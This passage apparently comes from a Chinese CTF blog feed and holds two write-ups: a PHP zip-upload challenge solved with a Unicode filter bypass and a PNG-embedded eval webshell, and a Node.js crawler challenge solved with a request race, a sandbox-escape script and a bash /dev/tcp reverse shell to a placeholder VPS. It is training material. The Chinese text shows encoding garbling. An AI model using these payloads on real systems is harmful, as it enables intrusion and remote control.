<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"éƒ½ä¸èƒ½è§£å‹å‘¢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ"</span><span class="token punctuation">;</span>
    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment"># ç”± $file åˆ›å»ºä¸€ä¸ªæ–°å›¾åƒ</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=&gt;</span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=&gt;</span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment"># å°†å›¾åƒè£å‰ªåˆ°ç»™å®šçš„çŸ©å½¢</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment"># ç›¸å½“äºæ–‡ä»¶å</span>
            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>éœ€è¦ä¼ <code>.zip</code>æ–‡ä»¶ï¼Œä½†æ˜¯é¦–é¡µæºç æŠŠ<code>i</code>è¿™ä¸ªå­—æ¯è¿‡æ»¤æ‰äº†ï¼Œæˆ‘ä»¬åªèƒ½æ€è€ƒé¦–é¡µæºç ç¬¬25è¡Œ<code>mb_strtolower()</code>å‡½æ•°å¯å¦åˆ©ç”¨ã€‚å¯ä»¥åˆ©ç”¨ä¸€äº›unicodeå­—ç¬¦ç»•è¿‡ã€‚ç»è¿‡æµ‹è¯•å‘ç°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ä°'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
#ç»“æœä¸ºtrueï¼Œå¹¶ä¸”é¦–é¡µæºç ç¬¬21è¡Œè¿˜æ‰§è¡Œäº†urldecodeã€‚æ‰€ä»¥å¯ä»¥ç”¨%c4%b0ä»£æ›¿'Ä°'å­—ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸ºäº†ç»•è¿‡å›¾ç‰‡æ£€æµ‹ï¼Œå°†ä¸€å¥è¯å†™å…¥pngå›¾ç‰‡è„šæœ¬å¦‚ä¸‹ï¼ˆå›¾ç‰‡éšå†™æŠ€å·§ï¼‰ï¼š</p>
<p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p>
<p>åœ¨[Entropy - CyberChef](<a href="https://gchq.github.io/CyberChef/#recipe=Entropy">https://gchq.github.io/CyberChef/#recipe=Entropy</a>(â€˜Shannon scaleâ€™))è¿›è¡Œå¦‚ä¸‹è§£ç æ“ä½œï¼ˆä¸­é—´Raw Deflateæ˜¯PNGå›¾ç‰‡IDATçš„å‹ç¼©ç®—æ³•deflate/inflateï¼Œå‚è€ƒï¼š<a href="https://vivaxyblog.github.io/2019/12/07/decode-a-png-image-with-javascript-cn.html%EF%BC%89">https://vivaxyblog.github.io/2019/12/07/decode-a-png-image-with-javascript-cn.htmlï¼‰</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918102916094.png"></p>
<p>åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨Winhexé‡Œä¿®æ”¹payloadå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104745787.png"></p>
<p>ä¿®æ”¹å‰ååå…­è¿›åˆ¶å€¼å¯¹æ¯”å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">5b 3c 3f 3d 24 5f 47 45 54 5b 30 5d 28 24 5f 50 4f 53 54 5b 31 5d 29 3b 3f 3e 58 00 00
5B 3C 3F 3D 45 56 41 4C 28 24 5F 50 4F 53 54 5B 31 5D 29 3B 20 20 20 20 3F 3E 58 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶åå†è¿›è¡Œç¼–ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104417784.png"></p>
<pre class="line-numbers language-none"><code class="language-none">a39f67641d201612546f112e29152b2167226b505050506f5f5310<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¿®æ”¹ä»£ç å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104709439.png"></p>
<p>ç”Ÿæˆå¸¦æœ‰payloadçš„<code>a.png</code>ï¼Œç„¶åä¿®æ”¹å›¾ç‰‡åç¼€ä¸ºphpå¹¶å‹ç¼©æˆzip</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918110616664.png"></p>
<p>æœ¬åœ°phpstudyå¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œè®¿é—®å¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>ä¸Šä¼ é¡µé¢<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://666a12e6-ffb1-4a49-b7cc-ba6766cecb88.node4.buuoj.cn:81/upload.php?ctf=upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨é¡µé¢ä¸­ä¸Šä¼ <code>a.zip</code>ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹å¦‚ä¸‹ä¸¤ä¸ªä½ç½®ï¼Œå‘é€è¯·æ±‚åŒ…å³å¯çœ‹åˆ°å“åº”ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918130927369.png"></p>
<p>ç„¶åè®¿é—®<code>/example.php?ctf=poc</code>ï¼Œå¹¶å‘é€postæ•°æ®ï¼Œè§£å‹<code>a.zip</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918131639255.png" style="zoom: 80%;">

<p>ç”±example.phpæ–‡ä»¶çš„ç¬¬35è¡Œä»£ç <code>imagepng($second, 'example/'.$final_name);</code>å¯çŸ¥ï¼Œæ–‡ä»¶æœ€ç»ˆè·¯å¾„åœ¨<code>/example/a.php</code>ï¼Œèšå‰‘è®¿é—®è¿æ¥ï¼Œåœ¨<code>/etc</code>å­ç›®å½•ä¸‹è¯»åˆ°flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918132238458.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ bypass</tag>
        <tag>phpä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç¥¥äº‘æ¯-cralwer_z</title>
    <url>/posts/9a2f1a58.html</url>
    <content><![CDATA[<h1 id="2021ç¥¥äº‘æ¯-cralwer-z"><a href="#2021ç¥¥äº‘æ¯-cralwer-z" class="headerlink" title="2021ç¥¥äº‘æ¯-cralwer_z"></a>2021ç¥¥äº‘æ¯-cralwer_z</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šjsä»£ç å®¡è®¡</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825142515319.png"></p>
<p>éšä¾¿æ³¨å†Œä¸ªç”¨æˆ·ç™»å½•è¿›å»ï¼ˆç¬”è€…æ­¤å¤„æ³¨å†Œadminï¼‰ï¼Œåœ¨Profileé¡µé¢å¯ä»¥æ›´æ–°ä¸ªäººä¿¡æ¯</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825143457273.png" style="zoom:67%;">

<p>æœ‰æºç ï¼Œæºç ç»“æ„ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825143612374.png"></p>
<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>æºç ä¸­çš„<code>findByPK()</code>å’Œ<code>findOne()</code>æ˜¯Sequelize APIï¼Œæ•ˆæœå¯ä»¥ç±»æ¯”æ•°æ®åº“æŸ¥è¯¢</p>
<p>å…·ä½“å‚è€ƒï¼š<a href="https://sequelize.org/docs/v6/core-concepts/model-querying-finders/">https://sequelize.org/docs/v6/core-concepts/model-querying-finders/</a></p>
<p>é¦–å…ˆserver.jsè§„å®šäº†ç”¨æˆ·è·¯ç”±ä»<code>/user</code>å¼€å§‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825144252403.png"></p>
<p><code>/routes/index.js</code>æ˜¯å¸¸è§„çš„é¦–é¡µæ³¨å†Œã€ç™»å½•ã€ç™»å‡ºåŠŸèƒ½</p>
<p><code>/routes/user.js</code>æœ‰å‡ ä¸ªå…³é”®è·¯ç”±</p>
<p><code>/user/profile</code>è·¯ç”±ï¼Œåˆ†ä¸ºä¸‰éƒ¨åˆ†</p>
<p>1.è¦æ±‚ä¼ å…¥å‚æ•°affiliationã€ageã€bucketä¸ä¸ºç©ºä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œå…¶ä¸­<code>checkBucket()</code>è¦æ±‚bucketåè®®æ˜¯<code>http:</code>æˆ–<code>https:</code>ï¼Œä¸”urlåŒ…å«<code>oss-cn-beijing.ichunqiu.com</code>å­—ç¬¦ä¸²ï¼ˆä»£ç åœ¨ç¬¬äºŒå¼ å›¾ï¼‰ï¼›</p>
<p>2.æŠŠä¼ å…¥çš„affiliationã€ageã€bucketå‚æ•°å€¼æ›´æ–°åˆ°æ•°æ®åº“ï¼ˆbucketèµ‹å€¼ç»™personalBucketï¼‰ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªtokenï¼›</p>
<p>3.æ­£åˆ™åŒ¹é…bucketï¼Œè‹¥ç¬¦åˆæ­£åˆ™ï¼Œåˆ™ç”¨ä¸Šä¸€æ­¥ç”Ÿæˆçš„tokenè·³è½¬è®¿é—®<code>/user/verify</code>è·¯ç”±ï¼Œåä¹‹åˆ™è¿”å›æç¤ºï¼›</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825144624938.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825151144701.png"></p>
<p><code>/user/verify</code>è·¯ç”±</p>
<p>éªŒè¯tokenï¼ŒéªŒè¯æˆåŠŸåˆ™æ›´æ–°æ•°æ®åº“ä¸­ç”¨æˆ·çš„bucketï¼ˆpersonalBucketèµ‹å€¼ç»™bucketï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825151848998.png"></p>
<p><code>/user/bucket</code>è·¯ç”±</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825153629000.png"></p>
<p>è¿™é‡Œçš„æ­£åˆ™è·Ÿ<code>/user/profile</code>çš„æ­£åˆ™æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„elseæœ‰ä¸€ä¸ªå¯¹ç”¨æˆ·bucketçš„è¯·æ±‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨ç‚¹ï¼Œè¦æƒ³åˆ©ç”¨bucketï¼Œé‚£å°±è¦æ¸…æ¥šbucketæ€ä¹ˆæ§åˆ¶ï¼Œbucketä¼ é€’è·¯çº¿å¦‚ä¸‹</p>
<p><code>/user/profile</code>ä¼ å…¥bucketå‚æ•°â†’æ•°æ®åº“èµ‹å€¼ç»™personalBucketâ†’<code>/user/verify</code>å†æŠŠpersonalBucketèµ‹å€¼ç»™bucket</p>
<p>ç›¸å½“äºåœ¨æ•°æ®åº“å…œäº†ä¸€åœˆï¼Œæƒ³è¯·æ±‚bucketï¼Œå°±å¿…é¡»ç»è¿‡<code>/user/verify</code>ï¼Œé‚£ä¹ˆ<code>/user/profile</code>çš„æ­£åˆ™å°±å¿…é¡»åŒ¹é…æˆåŠŸï¼Œé‚£ä¹ˆ<code>/user/bucket</code>çš„æ­£åˆ™ä¹Ÿä¼šåŒæ­¥åŒ¹é…æˆåŠŸï¼Œé‚£ä¹ˆå°±æ²¡æ³•è¯·æ±‚bucketã€‚</p>
<p>æ‰€ä»¥æ˜ç¡®ç›®æ ‡ï¼šè®©<code>/user/profile</code>æ­£åˆ™åŒ¹é…æˆåŠŸï¼ŒåŒæ—¶<code>/user/bucket</code>æ­£åˆ™åŒ¹é…å¤±è´¥ï¼Œæœ€ç»ˆçš„bucketè¿˜è¦æ˜¯æˆ‘ä»¬è‡ªå·±çš„URL</p>
<p>æ­¤æ—¶çœ‹<code>/user/profile</code>ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒçš„é€»è¾‘æ˜¯å…ˆæ›´æ–°bucketï¼Œå†æ­£åˆ™åŒ¹é…ï¼Œç„¶åå†é‡å®šå‘åˆ°<code>/user/verify</code>ï¼Œ</p>
<p>ä¸”checkBucket()æ²¡æœ‰æ­£åˆ™é‚£ä¹ˆä¸¥æ ¼ï¼Œåªæ£€æŸ¥åè®®å’Œ<code>oss-cn-beijing.ichunqiu.com</code>å­—ç¬¦ä¸²</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘é€ä¸¤æ¬¡æ•°æ®åŒ…ï¼Œç¬¬ä¸€æ¬¡ä¼ æ­£å¸¸çš„bucketï¼Œé‡å®šå‘ä¹‹å‰ï¼Œç¬¬äºŒæ¬¡ä¼ ä¼ªé€ çš„bucketï¼Œæ ¼å¼å¦‚ä¸‹ï¼Œç„¶åè®©ç¬¬ä¸€ä¸ªè¯·æ±‚ç»§ç»­é‡å®šå‘ï¼Œå†è®¿é—®<code>/user/bucket</code>è·¯ç”±ï¼Œå³å¯è¿›åˆ°elseï¼Œä»è€Œå¯¹ä¼ªé€ çš„bucketå‘èµ·è¯·æ±‚</p>
<pre class="line-numbers language-none"><code class="language-none">http%3A%2F%2Fxx.xx.xx.xx/index.html?oss-cn-beijing.ichunqiu.com%2F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>xx.xx.xx.xxæ˜¯è‡ªå·±çš„vpsï¼Œä¸Šè¿°æ“ä½œä¹‹å‰å…ˆåœ¨vpså»ºä¸€ä¸ªindex.htmlï¼Œä»£ç å¦‚ä¸‹ï¼Œç„¶åå¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
    a=this.constructor.constructor.constructor.constructor('return process')();
    b=a.mainModule.require('child_process');
    c=b.execSync('cat /flag').toString();
    document.write(c);
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å®é™…æ“ä½œ"><a href="#å®é™…æ“ä½œ" class="headerlink" title="å®é™…æ“ä½œ"></a>å®é™…æ“ä½œ</h2><p>å…ˆåœ¨vpså»ºä¸€ä¸ªindex.htmlï¼Œç„¶åå¼€å¯httpæœåŠ¡</p>
<p>é¢˜ç›®æ­£å¸¸æ³¨å†Œï¼Œç™»å½•ï¼Œç„¶åæŠ“å–<code>/user/profile</code>çš„æ•°æ®åŒ…ï¼Œå‘é€åˆ°Repeaterä¸¤ä»½ï¼Œç¬¬ä¸€ä»½æ­£å¸¸å‘é€</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825162525722.png"></p>
<p>ç¬¬äºŒä»½ä¿®æ”¹bucketåå‘é€ï¼Œå“åº”åŒ…ä¹Ÿå¯çœ‹åˆ°ç»•è¿‡<code>/user/profile</code>æ­£åˆ™çš„æç¤º</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163018649.png"></p>
<p>ç„¶åå›åˆ°ç¬¬ä¸€ä»½ï¼Œç‚¹å‡»å·¦ä¸Šè§’Sendé‚£ä¸€è¡Œçš„<code>Follow Redirection</code>ï¼ŒæˆåŠŸæ›´æ–°bucket</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163504396.png"></p>
<p>URLè®¿é—®<code>/user/bucket</code>ï¼Œè·å–flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163715777.png"></p>
<p>ä¹Ÿå¯åå¼¹shellï¼Œè‹¥ç”¨è¿™ä¸ªï¼Œå¯ç”¨screenå‘½ä»¤åœ¨vpså¼€ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªå¼€å¯httpæœåŠ¡ï¼Œä¸€ä¸ªç›‘å¬åå¼¹shellç«¯å£</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/9898 0&gt;&amp;1'],);console.log(ls.output.toString());")()
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825164757525.png"></p>
<p>å›å¤´çœ‹ï¼Œé—®é¢˜åœ¨äºcheckBucket()ä¸å¤Ÿä¸¥æ ¼ï¼Œåªæ£€æŸ¥åè®®å’Œ<code>oss-cn-beijing.ichunqiu.com</code>å­—ç¬¦ä¸²</p>
<p>é¿å…æ¼æ´çš„æ€è·¯ï¼š<code>/user/profile</code>ä¸­checkBucket()ç”¨æ­£åˆ™çš„é€»è¾‘ï¼›æˆ–è€…å…ˆæ­£åˆ™åŒ¹é…ï¼Œå†æ›´æ–°bucket</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/124189883">https://blog.csdn.net/RABCDXB/article/details/124189883</a></p>
<p><a href="https://blog.csdn.net/cjdgg/article/details/120147572">https://blog.csdn.net/cjdgg/article/details/120147572</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
